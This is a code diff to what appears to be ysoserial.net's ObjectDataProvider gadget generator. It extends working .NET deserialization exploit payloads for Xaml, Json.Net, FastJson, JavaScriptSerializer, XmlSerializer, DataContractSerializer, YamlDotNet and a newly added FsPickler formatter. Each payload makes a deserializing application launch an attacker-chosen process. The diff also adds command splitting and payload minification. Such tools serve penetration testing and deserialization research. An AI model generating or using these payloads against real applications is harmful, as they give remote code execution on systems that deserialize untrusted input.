@@ -25,7 +25,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "Xaml", "Json.Net", "FastJson", "JavaScriptSerializer", "XmlSerializer", "DataContractSerializer", "YamlDotNet < 5.0.0" };
+            return new List<string> { "Xaml", "Json.Net", "FastJson", "JavaScriptSerializer", "XmlSerializer", "DataContractSerializer", "YamlDotNet < 5.0.0", "FsPickler" };
         }
 
         public override string Name()
@@ -38,13 +38,18 @@ namespace ysoserial.Generators
             return "Oleksandr Mirosh and Alvaro Munoz";
         }
 
-        public override object Generate(string cmd, string formatter, Boolean test)
+        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify)
         {
             if (formatter.ToLower().Equals("xaml"))
             {
                 ProcessStartInfo psi = new ProcessStartInfo();
-                psi.FileName = "cmd";
-                psi.Arguments = "/c " + cmd;
+                Boolean hasArgs;
+                string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, out hasArgs);
+                psi.FileName = splittedCMD[0];
+                if (hasArgs)
+                {
+                    psi.Arguments = splittedCMD[1];
+                }
                 StringDictionary dict = new StringDictionary();
                 psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
                 Process p = new Process();
@@ -54,7 +59,13 @@ namespace ysoserial.Generators
                 odp.IsInitialLoadEnabled = false;
                 odp.ObjectInstance = p;
 
-                string payload  = XamlWriter.Save(odp);
+                string payload = XamlWriter.Save(odp);
+
+                if (minify)
+                {
+                    // using discardable regex array to make it shorter!
+                    payload = Helpers.XMLMinifier.Minify(payload, null, new String[] { @"StandardErrorEncoding=.*LoadUserProfile=""False"" ", @"IsInitialLoadEnabled=""False"" " });
+                }
 
                 if (test)
                 {
@@ -72,15 +83,32 @@ namespace ysoserial.Generators
             }
             if (formatter.ToLower().Equals("json.net"))
             {
+                Boolean hasArgs;
+                string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.JSON, out hasArgs);
+
+                if (hasArgs)
+                {
+                    cmd = "'" + splittedCMD[0] + "', '" + splittedCMD[1] + "'";
+                }
+                else
+                {
+                    cmd = "'" + splittedCMD[0] + "'";
+                }
+
                 String payload = @"{
     '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
     'MethodName':'Start',
     'MethodParameters':{
         '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
-        '$values':['cmd','/c " + cmd + @"']
+        '$values':[" + cmd + @"]
     },
     'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
 }";
+                if (minify)
+                {
+                    payload = Helpers.JSONMinifier.Minify(payload, new String[] { "PresentationFramework", "mscorlib", "System" }, null);
+                }
+
                 if (test)
                 {
                     try
@@ -98,6 +126,20 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("fastjson"))
             {
+                Boolean hasArgs;
+                string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.JSON, out hasArgs);
+
+                String cmdPart;
+
+                if (hasArgs)
+                {
+                    cmdPart = @"""FileName"":""" + splittedCMD[0] + @""",""Arguments"":""" + splittedCMD[1] + @"""";
+                }
+                else
+                {
+                    cmdPart = @"""FileName"":""" + splittedCMD[0] + @"""";
+                }
+
                 String payload = @"{
     ""$types"":{
         ""System.Windows.Data.ObjectDataProvider, PresentationFramework, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = 31bf3856ad364e35"":""1"",
@@ -109,12 +151,17 @@ namespace ysoserial.Generators
         ""$type"":""2"",
         ""StartInfo"":{
             ""$type"":""3"",
-            ""FileName"":""cmd"",
-            ""Arguments"":""/c " + cmd + @"""
+            " + cmdPart + @"
         }
     },
     ""MethodName"":""Start""
 }";
+
+                if (minify)
+                {
+                    payload = Helpers.JSONMinifier.Minify(payload, null, null);
+                }
+
                 if (test)
                 {
                     try
@@ -130,6 +177,20 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("javascriptserializer"))
             {
+                Boolean hasArgs;
+                string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.JSON, out hasArgs);
+
+                String cmdPart;
+
+                if (hasArgs)
+                {
+                    cmdPart = "'FileName':'" + splittedCMD[0] + "', 'Arguments':'" + splittedCMD[1] + "'";
+                }
+                else
+                {
+                    cmdPart = "'FileName':'" + splittedCMD[0] + "'";
+                }
+
                 String payload = @"{
     '__type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
     'MethodName':'Start',
@@ -137,11 +198,16 @@ namespace ysoserial.Generators
         '__type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
         'StartInfo': {
             '__type':'System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
-            'FileName':'cmd',
-            'Arguments':'/c " + cmd + @"'
+            " + cmdPart + @"
         }
     }
 }";
+
+                if (minify)
+                {
+                    payload = Helpers.JSONMinifier.Minify(payload, null, null);
+                }
+
                 if (test)
                 {
                     try
@@ -157,22 +223,30 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("xmlserializer"))
             {
+
+                Boolean hasArgs;
+                string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.XML, out hasArgs);
+
+                String cmdPart;
+
+                if (hasArgs)
+                {
+                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{splittedCMD[0]}</b:String><b:String>{splittedCMD[1]}</b:String>";
+                }
+                else
+                {
+                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{splittedCMD[0]}</b:String>";
+                }
+
                 String payload = $@"<?xml version=""1.0""?>
-<root xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
-    <ExpandedWrapperOfXamlReaderObjectDataProvider>
+<root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
+    <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" >
         <ExpandedElement/>
         <ProjectedProperty0>
             <MethodName>Parse</MethodName>
             <MethodParameters>
                 <anyType xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xsi:type=""xsd:string"">
-                    &lt;ResourceDictionary xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot; xmlns:x=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot; xmlns:System=&quot;clr-namespace:System;assembly=mscorlib&quot; xmlns:Diag=&quot;clr-namespace:System.Diagnostics;assembly=system&quot;&gt;
-                        &lt;ObjectDataProvider x:Key=&quot;LaunchCmd&quot; ObjectType=&quot;{{x:Type Diag:Process}}&quot; MethodName=&quot;Start&quot;&gt;
-                            &lt;ObjectDataProvider.MethodParameters&gt;
-                                &lt;System:String&gt;cmd&lt;/System:String&gt;
-                                &lt;System:String&gt;/c {cmd}&lt;/System:String&gt;
-                            &lt;/ObjectDataProvider.MethodParameters&gt;
-                        &lt;/ObjectDataProvider&gt;
-                    &lt;/ResourceDictionary&gt;
+                    <![CDATA[<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{{d:Type c:Process}}"" MethodName=""Start"">{cmdPart}</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                 </anyType>
             </MethodParameters>
             <ObjectInstance xsi:type=""XamlReader""></ObjectInstance>
@@ -180,6 +254,13 @@ namespace ysoserial.Generators
     </ExpandedWrapperOfXamlReaderObjectDataProvider>
 </root>
 ";
+
+                if (minify)
+                {
+                    payload = Helpers.XMLMinifier.Minify(payload, null, null);
+                }
+
+
                 if (test)
                 {
                     try
@@ -188,7 +269,7 @@ namespace ysoserial.Generators
                         xmlDoc.LoadXml(payload);
                         XmlElement xmlItem = (XmlElement)xmlDoc.SelectSingleNode("root");
                         var s = new XmlSerializer(Type.GetType(xmlItem.GetAttribute("type")));
-                        var d = s.Deserialize (new XmlTextReader(new StringReader(xmlItem.InnerXml)));
+                        var d = s.Deserialize(new XmlTextReader(new StringReader(xmlItem.InnerXml)));
                     }
                     catch
                     {
@@ -198,9 +279,26 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("datacontractserializer"))
             {
+
+                Boolean hasArgs;
+                string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.XML, out hasArgs);
+
+                String cmdPart;
+
+                if (hasArgs)
+                {
+                    cmdPart = $@"<b:anyType i:type=""c:string"">" + splittedCMD[0] + @"</b:anyType>
+          <b:anyType i:type=""c:string"">" + splittedCMD[1] + "</b:anyType>";
+                }
+                else
+                {
+                    cmdPart = $@"<b:anyType i:type=""c:string"" xmlns:c=""http://www.w3.org/2001/XMLSchema"">" + splittedCMD[0] + @"</b:anyType>";
+                }
+
                 String payload = $@"<?xml version=""1.0""?>
-<root xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
-    <ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL xmlns=""http://schemas.datacontract.org/2004/07/System.Data.Services.Internal""
+<root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
+    <ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL xmlns=""http://schemas.datacontract.org/2004/07/System.Data.Services.Internal"" 
+                                                         xmlns:c=""http://www.w3.org/2001/XMLSchema""
                                                          xmlns:i=""http://www.w3.org/2001/XMLSchema-instance""
                                                          xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"">
       <ExpandedElement z:Id=""ref1"" xmlns:a=""http://schemas.datacontract.org/2004/07/System.Diagnostics"">
@@ -209,14 +307,18 @@ namespace ysoserial.Generators
       <ProjectedProperty0 xmlns:a=""http://schemas.datacontract.org/2004/07/System.Windows.Data"">
         <a:MethodName>Start</a:MethodName>
         <a:MethodParameters xmlns:b=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">
-          <b:anyType i:type=""c:string"" xmlns:c=""http://www.w3.org/2001/XMLSchema"">cmd</b:anyType>
-          <b:anyType i:type=""c:string"" xmlns:c=""http://www.w3.org/2001/XMLSchema"">/c {cmd}</b:anyType>
+          " + cmdPart + @"
         </a:MethodParameters>
         <a:ObjectInstance z:Ref=""ref1""/>
       </ProjectedProperty0>
     </ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL>
 </root>
 ";
+                if (minify)
+                {
+                    payload = Helpers.XMLMinifier.Minify(payload, null, null, Helpers.FormatterType.DataContractXML);
+                }
+
                 if (test)
                 {
                     try
@@ -234,20 +336,40 @@ namespace ysoserial.Generators
                 return payload;
             }
             else if (formatter.ToLower().Equals("yamldotnet"))
+            {
+
+                Boolean hasArgs;
+                string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.YamlDotNet, out hasArgs);
+
+                String cmdPart;
+
+                if (hasArgs)
                 {
+                    cmdPart = $@"FileName: " + splittedCMD[0] + @",
+					Arguments: " + splittedCMD[1];
+                }
+                else
+                {
+                    cmdPart = $@"FileName: " + splittedCMD[0];
+                }
+
                 String payload = @"
-!<!System.Windows.Data.ObjectDataProvider%2c%20PresentationFramework%2c%20Version=4.0.0.0%2c%20Culture=neutral%2c%20PublicKeyToken=31bf3856ad364e35> {
+!<!System.Windows.Data.ObjectDataProvider,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35> {
     MethodName: Start,
 	ObjectInstance: 
-		!<!System.Diagnostics.Process%2c%20System%2c%20Version=4.0.0.0%2c%20Culture=neutral%2c%20PublicKeyToken=b77a5c561934e089> {
+		!<!System.Diagnostics.Process,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> {
 			StartInfo:
-				!<!System.Diagnostics.ProcessStartInfo%2c%20System%2c%20Version=4.0.0.0%2c%20Culture=neutral%2c%20PublicKeyToken=b77a5c561934e089> {
-					FileName : cmd,
-					Arguments : '/C " + cmd + @"'
+				!<!System.Diagnostics.ProcessStartInfo,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> {
+					" + cmdPart + @"
 
                 }
         }
 }";
+                if (minify)
+                {
+                    payload = Helpers.YamlDotNet.Minify(payload);
+                }
+
                 if (test)
                 {
                     try
@@ -258,6 +380,80 @@ namespace ysoserial.Generators
                             var deserializer = new DeserializerBuilder().Build();
                             var result = deserializer.Deserialize(reader);
                         }
+                    }
+                    catch
+                    {
+                    }
+                }
+                return payload;
+            }
+            else if (formatter.ToLower().Equals("fspickler"))
+            {
+                Boolean hasArgs;
+                string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.XML, out hasArgs);
+
+                String cmdPart;
+
+                if (hasArgs)
+                {
+                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{splittedCMD[0]}</b:String><b:String>{splittedCMD[1]}</b:String>";
+                }
+                else
+                {
+                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{splittedCMD[0]}</b:String>";
+                }
+
+                String internalPayload = @"<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{d:Type c:Process}"" MethodName=""Start"">" + cmdPart + @"</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>";
+
+                internalPayload = Helpers.CommandArgSplitter.JsonString(internalPayload);
+
+                String payload = @"{
+  ""FsPickler"": ""4.0.0"",
+  ""type"": ""System.Object"",
+  ""value"": {
+          ""_flags"": ""subtype"",
+          ""subtype"": {
+            ""Case"": ""NamedType"",
+            ""Name"": ""Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties"",
+            ""Assembly"": {
+              ""Name"": ""Microsoft.PowerShell.Editor"",
+              ""Version"": ""3.0.0.0"",
+              ""Culture"": ""neutral"",
+              ""PublicKeyToken"": ""31bf3856ad364e35""
+            }
+          },
+          ""instance"": {
+            ""serializationEntries"": [
+              {
+                ""Name"": ""ForegroundBrush"",
+                ""Type"": {
+                  ""Case"": ""NamedType"",
+                  ""Name"": ""System.String"",
+                  ""Assembly"": {
+                    ""Name"": ""mscorlib"",
+                    ""Version"": ""4.0.0.0"",
+                    ""Culture"": ""neutral"",
+                    ""PublicKeyToken"": ""b77a5c561934e089""
+                  }
+                },
+                ""Value"": """+ internalPayload + @"""
+              }
+            ]
+          }
+    }
+  }";
+
+                if (minify)
+                {
+                    payload = Helpers.JSONMinifier.Minify(payload, null, null);
+                }
+
+                if (test)
+                {
+                    try
+                    {
+                        var serializer = MBrace.CsPickler.CsPickler.CreateJsonSerializer(true);
+                        serializer.UnPickleOfString<Object>(payload);
                     }
                     catch
                     {
